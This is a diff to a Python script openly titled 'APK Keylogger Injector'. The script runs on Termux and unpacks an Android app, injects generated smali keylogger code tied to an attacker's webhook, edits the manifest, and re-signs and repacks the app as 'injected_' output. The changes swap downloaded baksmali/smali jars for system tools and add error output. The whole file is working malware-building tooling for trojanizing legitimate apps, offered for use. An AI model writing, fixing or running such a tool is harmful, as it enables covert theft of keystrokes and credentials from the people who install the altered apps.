@@ -1,11 +1,10 @@
 #!/usr/bin/env python3
 """
 ====================================================================
-  APK KEYLOGGER INJECTOR v5.0 – Hybrid DEX+Manifest Injection
-  - Uses baksmali/smali (auto‑downloaded) for DEX injection
-  - Uses apktool ONLY for manifest (no resources touched)
-  - Preserves ALL original resources, libs, assets
-  - APK installs and runs perfectly
+  APK KEYLOGGER INJECTOR v5.1 – Uses Termux baksmali/smali
+  - Uses system baksmali/smali (no downloads)
+  - Uses apktool ONLY for manifest
+  - Preserves ALL original resources
 ====================================================================
 """
 
@@ -38,16 +37,24 @@ def print_c(msg, color=Colors.RESET):
 # ---------------------------- DEPENDENCY CHECK ----------------------------
 def check_dependencies():
     missing = []
-    if shutil.which('java') is None:
-        missing.append(('java', 'pkg install openjdk-25 -y'))
-    if shutil.which('zipalign') is None:
-        missing.append(('zipalign', 'pkg install zipalign -y'))
-    if shutil.which('apktool') is None:
-        missing.append(('apktool', 'pkg install apktool -y'))
-    if shutil.which('aapt') is None:
-        print_c("[!] aapt not found. Please install: pkg install aapt -y", Colors.RED)
-        print_c("    Or install android-tools: pkg install android-tools -y", Colors.YELLOW)
-        sys.exit(1)
+    tools = {
+        'java': 'pkg install openjdk-25 -y',
+        'zipalign': 'pkg install zipalign -y',
+        'apktool': 'pkg install apktool -y',
+        'aapt': 'pkg install aapt -y',
+        'baksmali': 'pkg install baksmali -y',
+        'smali': 'pkg install smali -y'
+    }
+    
+    for tool, cmd in tools.items():
+        if tool in ['baksmali', 'smali']:
+            # Check if the jar exists
+            jar_path = f"/data/data/com.termux/files/usr/share/java/{tool}.jar"
+            if not os.path.exists(jar_path):
+                missing.append((tool, cmd))
+        else:
+            if shutil.which(tool) is None:
+                missing.append((tool, cmd))
     
     if missing:
         print_c("\n[!] Missing tools:", Colors.RED)
@@ -71,31 +78,6 @@ def check_dependencies():
         import requests
     
     print_c("[✓] All dependencies found.", Colors.GREEN)
-
-# ---------------------------- DOWNLOAD BAKSMALI / SMALI JARS ----------------------------
-JAR_DIR = os.path.join(os.path.expanduser("~"), ".dex_tools")
-os.makedirs(JAR_DIR, exist_ok=True)
-
-def download_jar(url, dest):
-    if os.path.exists(dest):
-        return
-    print_c(f"[*] Downloading {os.path.basename(dest)}...", Colors.YELLOW)
-    resp = requests.get(url, stream=True, timeout=60)
-    if resp.status_code != 200:
-        raise Exception(f"Download failed: {url}")
-    with open(dest, 'wb') as f:
-        for chunk in resp.iter_content(chunk_size=8192):
-            f.write(chunk)
-    print_c(f"[✓] Saved to {dest}", Colors.GREEN)
-
-def ensure_baksmali_smali():
-    baksmali_jar = os.path.join(JAR_DIR, "baksmali.jar")
-    smali_jar = os.path.join(JAR_DIR, "smali.jar")
-    baksmali_url = "https://repo1.maven.org/maven2/org/smali/baksmali/2.5.2/baksmali-2.5.2.jar"
-    smali_url = "https://repo1.maven.org/maven2/org/smali/smali/2.5.2/smali-2.5.2.jar"
-    download_jar(baksmali_url, baksmali_jar)
-    download_jar(smali_url, smali_jar)
-    return baksmali_jar, smali_jar
 
 # ---------------------------- KEYSTORE ----------------------------
 KEYSTORE = "mykeystore.jks"
@@ -292,17 +274,17 @@ def generate_smali(webhook, features, interval):
 '''
     return outer, inner
 
-# ---------------------------- INJECT DEX USING BAKSMALI/SMALI ----------------------------
-def inject_dex(apk_unzip_dir, webhook, features, interval, baksmali_jar, smali_jar):
+# ---------------------------- INJECT DEX USING SYSTEM BAKSMALI/SMALI ----------------------------
+def inject_dex(apk_unzip_dir, webhook, features, interval):
     # Find classes.dex
     dex_path = os.path.join(apk_unzip_dir, "classes.dex")
     if not os.path.exists(dex_path):
         raise Exception("No classes.dex found in APK")
     
-    # Disassemble
+    # Disassemble using system baksmali
     smali_out = os.path.join(apk_unzip_dir, "smali")
     print_c("[*] Disassembling classes.dex...", Colors.YELLOW)
-    cmd = ["java", "-jar", baksmali_jar, "d", dex_path, "-o", smali_out]
+    cmd = ["baksmali", "d", dex_path, "-o", smali_out]
     result = subprocess.run(cmd, capture_output=True, text=True)
     if result.returncode != 0:
         print_c("[!] Baksmali failed:", Colors.RED)
@@ -319,10 +301,10 @@ def inject_dex(apk_unzip_dir, webhook, features, interval, baksmali_jar, smali_j
         f.write(inner)
     print_c("[DEBUG] Smali injected.", Colors.CYAN)
     
-    # Reassemble
+    # Reassemble using system smali
     print_c("[*] Reassembling classes.dex...", Colors.YELLOW)
     new_dex = os.path.join(apk_unzip_dir, "classes.dex")
-    cmd = ["java", "-jar", smali_jar, "a", smali_out, "-o", new_dex]
+    cmd = ["smali", "a", smali_out, "-o", new_dex]
     result = subprocess.run(cmd, capture_output=True, text=True)
     if result.returncode != 0:
         print_c("[!] Smali failed:", Colors.RED)
@@ -344,6 +326,8 @@ def edit_manifest_apktool(original_apk, features):
         cmd = [shutil.which('apktool'), "d", "-m", original_apk, "-o", manifest_dir, "-f"]
         result = subprocess.run(cmd, capture_output=True, text=True)
         if result.returncode != 0:
+            print_c("[!] Apktool decode failed:", Colors.RED)
+            print_c(result.stderr, Colors.RED)
             raise Exception("Failed to decode manifest")
         
         # Edit manifest
@@ -421,25 +405,22 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
     os.makedirs(apk_unzip_dir, exist_ok=True)
     
     try:
-        # 1. Ensure baksmali/smali are downloaded
-        baksmali_jar, smali_jar = ensure_baksmali_smali()
-        
-        # 2. Unzip original APK
+        # 1. Unzip original APK
         print_c("[*] Extracting APK...", Colors.YELLOW)
         with zipfile.ZipFile(input_apk, 'r') as zf:
             zf.extractall(apk_unzip_dir)
         
-        # 3. Inject DEX
-        inject_dex(apk_unzip_dir, webhook, features, interval, baksmali_jar, smali_jar)
+        # 2. Inject DEX
+        inject_dex(apk_unzip_dir, webhook, features, interval)
         
-        # 4. Edit manifest using apktool
+        # 3. Edit manifest using apktool
         new_manifest = edit_manifest_apktool(input_apk, features)
         manifest_path = os.path.join(apk_unzip_dir, "AndroidManifest.xml")
         with open(manifest_path, 'wb') as f:
             f.write(new_manifest)
         print_c("[✓] Manifest updated.", Colors.GREEN)
         
-        # 5. Repack APK
+        # 4. Repack APK
         print_c("[*] Repacking APK...", Colors.YELLOW)
         apk_unsigned = os.path.join(work_dir, "app-unsigned.apk")
         with zipfile.ZipFile(apk_unsigned, 'w', zipfile.ZIP_DEFLATED) as zf:
@@ -449,7 +430,7 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
                     arcname = os.path.relpath(file_path, apk_unzip_dir)
                     zf.write(file_path, arcname)
         
-        # 6. Sign
+        # 5. Sign
         print_c("[*] Signing APK...", Colors.YELLOW)
         apk_signed = os.path.join(work_dir, "app-signed.apk")
         sign_cmd = [
@@ -463,7 +444,7 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
             print_c(result.stderr, Colors.RED)
             raise Exception("APK signing failed.")
         
-        # 7. Align
+        # 6. Align
         print_c("[*] Aligning APK...", Colors.YELLOW)
         apk_final = os.path.join(work_dir, "app-final.apk")
         align_cmd = [shutil.which('zipalign'), "-v", "-p", "4", apk_unsigned, apk_final]
@@ -473,7 +454,7 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
             print_c(result.stderr, Colors.RED)
             raise Exception("APK alignment failed.")
         
-        # 8. Copy to output
+        # 7. Copy to output
         output_apk = os.path.join(output_dir, f"injected_{os.path.basename(input_apk)}")
         shutil.copy(apk_final, output_apk)
         shutil.rmtree(work_dir, ignore_errors=True)
@@ -516,8 +497,8 @@ def clear_screen():
 def show_banner():
     print_c("""
     ╔═══════════════════════════════════════════╗
-    ║   APK KEYLOGGER INJECTOR v5.0            ║
-    ║   Hybrid DEX + Manifest Injection        ║
+    ║   APK KEYLOGGER INJECTOR v5.1            ║
+    ║   Uses system baksmali/smali             ║
     ║   Works on Android 17+ (and below)       ║
     ╚═══════════════════════════════════════════╝
     """, Colors.CYAN)
@@ -610,7 +591,7 @@ def about():
     clear_screen()
     show_banner()
     print_c("\n--- ABOUT ---", Colors.BLUE)
-    print_c("APK Keylogger Injector v5.0")
+    print_c("APK Keylogger Injector v5.1")
     print_c("\nHow it works:")
     print_c("  1. Injects smali code directly into classes.dex")
     print_c("  2. Edits AndroidManifest.xml using apktool (manifest only)")
